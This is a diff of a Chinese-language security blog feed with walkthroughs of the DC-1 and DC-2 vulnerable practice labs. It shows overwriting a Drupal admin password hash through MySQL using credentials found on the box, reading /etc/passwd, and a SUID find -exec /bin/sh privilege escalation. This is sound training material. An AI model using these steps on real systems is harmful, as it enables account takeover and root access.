+	width=&#34;1056&#34;
+	height=&#34;855&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/17d7d7218132493c8896076f003cb3b5_hu10814957263974967113.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/17d7d7218132493c8896076f003cb3b5_hu1648977990327444906.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;123&#34;
+		data-flex-basis=&#34;296px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag2&#34;&gt;flag2
+&lt;/h2&gt;&lt;p&gt;在其文件中发现flag2和数据库账号密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/8264c1500cd244deb07ccfaca971d2b5.png&#34;
+	width=&#34;909&#34;
+	height=&#34;670&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/8264c1500cd244deb07ccfaca971d2b5_hu13729077838431376427.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/8264c1500cd244deb07ccfaca971d2b5_hu5156422261886193812.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;135&#34;
+		data-flex-basis=&#34;325px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag3&#34;&gt;flag3
+&lt;/h2&gt;&lt;p&gt;进入数据库&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql -udbuser -pR0ck3t
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/3c81aa073b1e4ba5bff1350b16998598.png&#34;
+	width=&#34;986&#34;
+	height=&#34;391&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/3c81aa073b1e4ba5bff1350b16998598_hu1121978028286908927.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/3c81aa073b1e4ba5bff1350b16998598_hu10948255851711147548.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;252&#34;
+		data-flex-basis=&#34;605px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查看数据库&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/42b16a37fac94e18b088869bf9aa710c.png&#34;
+	width=&#34;397&#34;
+	height=&#34;244&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/42b16a37fac94e18b088869bf9aa710c_hu17251630375236750763.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/42b16a37fac94e18b088869bf9aa710c_hu6135200414120144283.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;162&#34;
+		data-flex-basis=&#34;390px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;使用drupaldb这个库并查看其所有的表&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/49e52f1569de4070bc8c02a7103e5f24.png&#34;
+	width=&#34;820&#34;
+	height=&#34;1014&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/49e52f1569de4070bc8c02a7103e5f24_hu15285816500054907870.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/49e52f1569de4070bc8c02a7103e5f24_hu15408931682821148108.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;80&#34;
+		data-flex-basis=&#34;194px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;查看user表的数据, 可以看到加密后的密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SDvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/83de4d20ebd84143b19f55a295e90e07.png&#34;
+	width=&#34;1030&#34;
+	height=&#34;864&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/83de4d20ebd84143b19f55a295e90e07_hu1782704451414778733.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/83de4d20ebd84143b19f55a295e90e07_hu8936350400565160262.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;119&#34;
+		data-flex-basis=&#34;286px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;发现密码是加密的，drupal中加密脚本在/var/www/script目录下的/password-hash.sh 用加密脚本写一个密码，然后去替换数据库中的密码值&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/90374e60819e4be0a74b7bc0401ec890.png&#34;
+	width=&#34;916&#34;
+	height=&#34;162&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/90374e60819e4be0a74b7bc0401ec890_hu18034328966631033251.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/90374e60819e4be0a74b7bc0401ec890_hu16354909207628125.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;565&#34;
+		data-flex-basis=&#34;1357px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;还真有，这就好办了，直接设置密码生成明文123456然后进行密文替换就好了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;php scripts/password-hash.sh 123456
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/768ec793ef3d4aedb0472394c344c733.png&#34;
+	width=&#34;1170&#34;
+	height=&#34;131&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/768ec793ef3d4aedb0472394c344c733_hu1203716401604027091.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/768ec793ef3d4aedb0472394c344c733_hu17144604922965271036.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;893&#34;
+		data-flex-basis=&#34;2143px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;进入mysql数据库，替换admin对应的密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;update drupaldb.users set pass=&amp;#39;$S$DNi3rZe1FTcrFGWf7hi1XDhGjut5he6qHCCNidUj4lNk9VYDozbp&amp;#39; where name=&amp;#39;admin&amp;#39;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/dc3b4a19987845789ce8e66c5f3a7892.png&#34;
+	width=&#34;1408&#34;
+	height=&#34;115&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/dc3b4a19987845789ce8e66c5f3a7892_hu3434932138230289545.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/dc3b4a19987845789ce8e66c5f3a7892_hu16402291093592669581.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1224&#34;
+		data-flex-basis=&#34;2938px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;成功替换密码，然后进行登录得到flag3&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/437fee588df94b1e828edc032d5b55c8.png&#34;
+	width=&#34;2092&#34;
+	height=&#34;1203&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/437fee588df94b1e828edc032d5b55c8_hu14640193374900177796.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/437fee588df94b1e828edc032d5b55c8_hu1719436486953401968.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
+		data-flex-basis=&#34;417px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag4&#34;&gt;flag4
+&lt;/h2&gt;&lt;p&gt;Special PERMS will help FIND the passwd - but you&amp;rsquo;ll need to -exec that command to work out how to get what&amp;rsquo;s in the shadow.&lt;/p&gt;
+&lt;p&gt;Flag3提示词有&lt;code&gt;perms、find、-exec、shadow&lt;/code&gt;共四个特殊提示词&lt;/p&gt;
+&lt;p&gt;提示看一下shadow&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/888b9ccdfbd34c1c8df1d75ed59875da.png&#34;
+	width=&#34;460&#34;
+	height=&#34;89&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/888b9ccdfbd34c1c8df1d75ed59875da_hu13304597419200458546.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/888b9ccdfbd34c1c8df1d75ed59875da_hu14893656905373678621.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;516&#34;
+		data-flex-basis=&#34;1240px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​编辑&lt;/p&gt;
+&lt;p&gt;无权访问 看一下密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f280bc83465a4232b596887ef6d6999d.png&#34;
+	width=&#34;727&#34;
+	height=&#34;776&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/f280bc83465a4232b596887ef6d6999d_hu8234224809545807040.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/f280bc83465a4232b596887ef6d6999d_hu2468431672806838795.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;93&#34;
+		data-flex-basis=&#34;224px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h1 id=&#34;三提权&#34;&gt;三.提权
+&lt;/h1&gt;&lt;h2 id=&#34;suid提权&#34;&gt;suid提权
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -user root -perm -4000 -exec ls -ldb {} \;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/c138e3a661c94c52b8b96863bb9dc9cb.png&#34;
+	width=&#34;902&#34;
+	height=&#34;587&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/c138e3a661c94c52b8b96863bb9dc9cb_hu3086194765597340292.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/c138e3a661c94c52b8b96863bb9dc9cb_hu10207335550814874529.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;368px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;h2 id=&#34;flag5&#34;&gt;flag5
+&lt;/h2&gt;&lt;p&gt;使用find命令提权&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find ./ aaa -exec &amp;#39;/bin/sh&amp;#39; \;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/30d041349eed44f2a83404993a416768.png&#34;
+	width=&#34;967&#34;
+	height=&#34;454&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test1-chinese/index.assets/30d041349eed44f2a83404993a416768_hu17363125153562022214.png 480w, https://dxlaboratory.github.io/p/test1-chinese/index.assets/30d041349eed44f2a83404993a416768_hu3404257812865346514.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;511px&#34;
+	
+&gt;&lt;img src=&#34;data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;​&lt;/p&gt;
+&lt;p&gt;成功拿下&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>DC-2</title>
+        <link>https://dxlaboratory.github.io/p/test2-chinese/</link>
+        <pubDate>Thu, 31 Oct 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://dxlaboratory.github.io/p/test2-chinese/</guid>
+        <description>&lt;h1 id=&#34;前言&#34;&gt;前言
 &lt;/h1&gt;&lt;hr&gt;
 &lt;blockquote&gt;
 &lt;p&gt;与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。
@@ -33,10 +913,10 @@
 （下载慢，放到迅雷里面）&lt;/p&gt;
 &lt;h2 id=&#34;vmware环境配置&#34;&gt;VMware环境配置
 &lt;/h2&gt;&lt;p&gt;必须是NAT模式，且攻击机也是NAT模式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47.png&#34;
 	width=&#34;1105&#34;
 	height=&#34;271&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu15866109228737243187.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu6299938560519909588.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu15866109228737243187.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu6299938560519909588.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47&#34;
@@ -118,10 +998,10 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;flag1&#34;&gt;flag1
 &lt;/h2&gt;&lt;p&gt;打开页面发现flag标志&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0.png&#34;
 	width=&#34;994&#34;
 	height=&#34;574&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu14232903875567318267.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu7079742860394796661.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu14232903875567318267.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu7079742860394796661.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -145,10 +1025,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cewl http://dc-2 -w passwd.txt
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3.png&#34;
 	width=&#34;348&#34;
 	height=&#34;577&#34;
-	srcset=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu9462413550411062395.png 480w, https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu16018118924427410528.png 1024w&#34;
+	srcset=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu9462413550411062395.png 480w, https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu16018118924427410528.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -166,10 +1046,10 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dirb http://dc-2 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dxlaboratory.github.io/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde.png&#34;
 	width=&#34;607&#34;
 	height=&#34;177&#34;
